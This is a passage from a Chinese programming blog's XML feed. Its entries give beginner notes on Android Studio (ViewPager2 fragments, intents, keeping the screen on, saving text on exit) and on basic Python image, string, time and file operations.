class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lwx.viewpagerfragmentapplication;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.viewpager2.widget.ViewPager2;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 定义内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> savedInstanceState</span><br><span class="hljs-comment">     */</span><br>    ViewPager2 viewpager;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 获取具体控件</span><br><span class="hljs-comment">         */</span><br>        viewpager=findViewById(R.id.diarypagers);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 初始化内容</span><br><span class="hljs-comment">         */</span><br>        initpager();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initpager</span><span class="hljs-params">()</span></span>&#123;<br>        viewpager=findViewById(R.id.diarypagers);<br>        ArrayList&lt;Fragment&gt; fragments=<span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        fragments.add(BlankFragment.newInstance(<span class="hljs-string">&quot;1&quot;</span>));<br>        fragments.add(BlankFragment.newInstance(<span class="hljs-string">&quot;2&quot;</span>));<br>        fragments.add(BlankFragment.newInstance(<span class="hljs-string">&quot;3&quot;</span>));<br>        fragments.add(BlankFragment.newInstance(<span class="hljs-string">&quot;4&quot;</span>));<br>        MyFragmentPagerAdapter pagerAdapter=<span class="hljs-keyword">new</span> MyFragmentPagerAdapter(getSupportFragmentManager(),getLifecycle(),fragments);<br>        viewpager.setAdapter(pagerAdapter);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图片操作</title>
    <link href="/2021/05/19/Python/%E5%9B%BE%E7%89%87%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/05/19/Python/%E5%9B%BE%E7%89%87%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="图片操作"><a href="#图片操作" class="headerlink" title="图片操作"></a>图片操作</h1><h1 id="TIL-Image"><a href="#TIL-Image" class="headerlink" title="TIL Image"></a>TIL Image</h1><p>具体代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 获得具体图像</span><br>tmpimg=Image.<span class="hljs-built_in">open</span>(filename)<br><span class="hljs-comment"># 获得图像像素点</span><br>width,heigh=tmpimg.size<br><span class="hljs-built_in">print</span>(filename+<span class="hljs-string">&quot;:\n宽度为：&quot;</span>+<span class="hljs-built_in">str</span>(width)+<span class="hljs-string">&quot;\n高度为：&quot;</span>+<span class="hljs-built_in">str</span>(heigh)+<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment"># 保存时自动优化</span><br>tmpimg.save(filename,quality=<span class="hljs-number">95</span>)<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>python</tag>
      
      <tag>图片</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python常用</title>
    <link href="/2021/05/19/Python/Python%E5%B8%B8%E7%94%A8/"/>
    <url>/2021/05/19/Python/Python%E5%B8%B8%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h1><h1 id="字符串包含"><a href="#字符串包含" class="headerlink" title="字符串包含"></a>字符串包含</h1><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#1</span><br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;Everyone has a world, quite and lonely!&quot;</span><br>     <br>    result = <span class="hljs-string">&quot;world&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span> <br>    result2 = <span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span><br>     <br>    <span class="hljs-built_in">print</span>(result,result2)<br>    <span class="hljs-comment">#结果为True False</span><br><span class="hljs-comment">#2</span><br>s = <span class="hljs-string">&quot;Everyone has a world, quite and lonely!&quot;</span><br>t = <span class="hljs-string">&quot;hello&quot;</span><br>t1 = <span class="hljs-string">&quot;world&quot;</span><br> <br><span class="hljs-built_in">print</span>(s.find(t),s.find(t1))<br><span class="hljs-built_in">print</span>(s.count(t),s.count(t1))<br><span class="hljs-built_in">print</span>(s.index(t1))<br><span class="hljs-comment">#返回具体位置</span><br></code></pre></div></td></tr></table></figure><h1 id="时间戳后转化"><a href="#时间戳后转化" class="headerlink" title="时间戳后转化"></a>时间戳后转化</h1><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">timeTo</span>(<span class="hljs-params">timez</span>):</span><br>    creat=time.localtime(timez)<br>    <span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,creat)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件常规操作</title>
    <link href="/2021/05/19/Python/%E6%96%87%E4%BB%B6%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/05/19/Python/%E6%96%87%E4%BB%B6%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="文件常规操作"><a href="#文件常规操作" class="headerlink" title="文件常规操作"></a>文件常规操作</h1><h1 id="创建文件及文件夹"><a href="#创建文件及文件夹" class="headerlink" title="创建文件及文件夹"></a>创建文件及文件夹</h1><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><ol><li>os.path.isdir判断是否是目录</li><li>os.path.isfile判断是否是文件</li></ol><h2 id="获取目录下文件名"><a href="#获取目录下文件名" class="headerlink" title="获取目录下文件名"></a>获取目录下文件名</h2><p>os.listdir</p><h3 id="创建文件："><a href="#创建文件：" class="headerlink" title="创建文件："></a>创建文件：</h3><p>  open(“test.txt”,”w”) 直接打开一个文件，如果文件不存在则创建文件w为重写 a为追加</p><h3 id="创建目录："><a href="#创建目录：" class="headerlink" title="创建目录："></a>创建目录：</h3><ol><li>os.path.exists(path) 判断一个目录是否存在</li><li>os.makedirs(path) 多层创建目录</li><li>os.mkdir(path) 创建目录</li></ol><h3 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h3><p>shutil.copyfile(“oldfile”,”newfile”) oldfile和newfile都只能是文件<br>shutil.copy(“oldfile”,”newfile”) oldfile只能是文件夹，newfile可以是文件，也可以是目标目录</p><p>对于 Windows 系统：</p><figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;copy 1.txt.py 2.txt.py&#x27;</span>) <br></code></pre></div></td></tr></table></figure><p>对于 Liunx 系统：</p><figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;cp 1.txt.py 2.txt.py&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="复制文件夹："><a href="#复制文件夹：" class="headerlink" title="复制文件夹："></a>复制文件夹：</h3><p>shutil.copytree(“olddir”,”newdir”) olddir和newdir都只能是目录，且newdir必须不存在</p><h3 id="重命名文件（目录）"><a href="#重命名文件（目录）" class="headerlink" title="重命名文件（目录）"></a>重命名文件（目录）</h3><p>os.rename(“oldname”,”newname”) 文件或目录都是使用这条命令</p><h3 id="移动文件（目录）"><a href="#移动文件（目录）" class="headerlink" title="移动文件（目录）"></a>移动文件（目录）</h3><p>shutil.move(“oldpos”,”newpos”)</p><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>os.remove(“file”)</p><h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><p>os.rmdir(“dir”) 只能删除空目录<br>shutil.rmtree(“dir”) 空目录、有内容的目录都可以删</p><h3 id="转换目录"><a href="#转换目录" class="headerlink" title="转换目录"></a>转换目录</h3><p>os.chdir(“path”) 换路径</p><h3 id="判断目标"><a href="#判断目标" class="headerlink" title="判断目标"></a>判断目标</h3><p>os.path.exists(“goal”) 判断目标是否存在<br>os.path.isdir(“goal”) 判断目标是否目录<br>os.path.isfile(“goal”) 判断目标是否文件</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">creat</span>(<span class="hljs-params">path</span>):</span><br>    <span class="hljs-keyword">if</span>(os.path.exists(path)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件已存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> path:<br>            <span class="hljs-comment"># 创建文件</span><br>            <span class="hljs-built_in">open</span>(path,<span class="hljs-string">&quot;w&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 创建目录</span><br>            os.makedirs(path)<br></code></pre></div></td></tr></table></figure><h3 id="获取文件时间"><a href="#获取文件时间" class="headerlink" title="获取文件时间"></a>获取文件时间</h3><ol><li> os.path.getatime(file) 输出文件访问时间</li><li> os.path.getctime(file) 输出文件的创建时间</li><li> os.path.getmtime(file) 输出文件最近修改时间</li></ol><h2 id="获取文件绝对路径"><a href="#获取文件绝对路径" class="headerlink" title="获取文件绝对路径"></a>获取文件绝对路径</h2><ol><li>os.path.abspath(filePath+os.path.sep+”..”).split(“\“)[-1] # 这里是获取父目录</li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>python</tag>
      
      <tag>文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 图片更换</title>
    <link href="/2021/05/19/AndroidStudio/Android%20Studio%20%E5%9B%BE%E7%89%87%E6%9B%B4%E6%8D%A2/"/>
    <url>/2021/05/19/AndroidStudio/Android%20Studio%20%E5%9B%BE%E7%89%87%E6%9B%B4%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-图片更换"><a href="#Android-Studio-图片更换" class="headerlink" title="Android Studio 图片更换"></a>Android Studio 图片更换</h1><h1 id="ImageView背景转换"><a href="#ImageView背景转换" class="headerlink" title="ImageView背景转换"></a>ImageView背景转换</h1><p>进行id资源锁定并展示</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//第一个为图片名（无后缀）第二个为具体文件夹 第三个为具体包</span><br><span class="hljs-keyword">int</span> imgsrc=getResources().getIdentifier(imgname,<span class="hljs-string">&quot;drawable&quot;</span>,<span class="hljs-string">&quot;com.lwx.blog&quot;</span>);<br><span class="hljs-comment">//设置ImageView图片背景</span><br>(具体ImageView).setBackgroundResource(imgsrc);<br></code></pre></div></td></tr></table></figure><p>减小比特展示</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 小知识</title>
    <link href="/2021/05/17/AndroidStudio/Android%20Studio%20%E5%B0%8F%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/05/17/AndroidStudio/Android%20Studio%20%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-小知识"><a href="#Android-Studio-小知识" class="headerlink" title="Android Studio 小知识"></a>Android Studio 小知识</h1><h1 id="携带数据跳转"><a href="#携带数据跳转" class="headerlink" title="携带数据跳转"></a>携带数据跳转</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//携带数据跳转界面</span><br>String data=<span class="hljs-string">&quot;Hello two！&quot;</span>;<br>Intent intent=<span class="hljs-keyword">new</span> Intent(FirstActivity.<span class="hljs-keyword">this</span>,TwoActivity.class);<br>intent.putExtra(<span class="hljs-string">&quot;extra_data&quot;</span>,data);<br>startActivity(intent);<br><span class="hljs-comment">//接受数据</span><br>Intent intent=getIntent();<br>String data=intent.getStringExtra(<span class="hljs-string">&quot;extra_data&quot;</span>);<br>Log.d(<span class="hljs-string">&quot;SenActivity&quot;</span>,data);<br></code></pre></div></td></tr></table></figure><h1 id="保持屏幕不息屏"><a href="#保持屏幕不息屏" class="headerlink" title="保持屏幕不息屏"></a>保持屏幕不息屏</h1><ol><li>在AndroidManifest.xml中添加权限</li></ol><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span><br></code></pre></div></td></tr></table></figure><ol start="2"><li>在onCreate生命周期，setContentView之前添加</li></ol><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);<br></code></pre></div></td></tr></table></figure><h1 id="退出界面时保存文件"><a href="#退出界面时保存文件" class="headerlink" title="退出界面时保存文件"></a>退出界面时保存文件</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.text.TextUtils;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.BufferedWriter;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.OutputStreamWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> EditText editText;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        editText=(EditText)findViewById(R.id.editText);<br>        String inputText=load();<br>        <span class="hljs-keyword">if</span>(!TextUtils.isEmpty(inputText))&#123;<br>            editText.setText(inputText);<br>            editText.setSelection(inputText.length());<br>            Toast.makeText(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;退出时保存的文字&quot;</span>,Toast.LENGTH_SHORT).show();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 结束app时所调用的流程</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">super</span>.onDestroy();<br>        String inputText=editText.getText().toString();<br>        save(inputText);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 具体保存流程</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> inputText</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">(String inputText)</span></span>&#123;<br>        FileOutputStream out=<span class="hljs-keyword">null</span>;<br>        BufferedWriter writer=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//打开文件进行操作</span><br>            out=openFileOutput(<span class="hljs-string">&quot;data&quot;</span>, Context.MODE_PRIVATE);<br>            writer=<span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(out));<br>            writer.write(inputText);<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-keyword">if</span>(writer!=<span class="hljs-keyword">null</span>)&#123;<br>                    writer.close();<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 加载流程</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">load</span><span class="hljs-params">()</span></span>&#123;<br>        FileInputStream in=<span class="hljs-keyword">null</span>;<br>        BufferedReader reader=<span class="hljs-keyword">null</span>;<br>        StringBuilder content=<span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//打开文件进行操作</span><br>            in=openFileInput(<span class="hljs-string">&quot;data&quot;</span>);<br>            reader=<span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(in));<br>            String line=<span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">while</span> ((line=reader.readLine())!=<span class="hljs-keyword">null</span>)&#123;<br>                content.append(line);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(reader!=<span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    reader.close();<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> content.toString();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 日记本</title>
    <link href="/2021/05/17/AndroidStudio/Android%20Studio%20%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    <url>/2021/05/17/AndroidStudio/Android%20Studio%20%E6%97%A5%E8%AE%B0%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-日记本"><a href="#Android-Studio-日记本" class="headerlink" title="Android Studio 日记本"></a>Android Studio 日记本</h1><p>突然想自己做一个日记的存储app，后面可能会加上数据库同步</p><p>增加部分功能！！！</p><h1 id="Activity部分"><a href="#Activity部分" class="headerlink" title="Activity部分"></a>Activity部分</h1><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.appcompat.app.ActionBar;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.content.SharedPreferences;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.preference.PreferenceManager;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.CheckBox;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> 